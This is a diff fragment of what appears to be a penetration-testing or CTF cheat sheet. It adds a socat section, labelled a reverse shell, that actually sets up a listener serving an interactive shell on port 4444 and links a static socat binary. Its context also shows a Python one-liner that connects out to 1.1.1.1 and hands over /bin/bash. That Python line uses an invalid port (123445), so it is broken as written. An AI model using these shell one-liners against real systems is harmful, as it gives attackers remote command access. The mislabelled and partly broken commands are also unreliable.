@@ -76,6 +76,13 @@ print(simgr.found[0].posix.dumps(0))
 run as a root
 `rm -f /dev/null; mknod -m 666 /dev/null c 1 3`
 
+
+## socat reversed shell
+> https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
+```
+socat tcp-l:4444,fork,reuseaddr exec:sh,pty,stderr,setsid,sigint,sane
+```
+
 ## python reversed shell
 ```sh
 python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.1.1.1',123445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
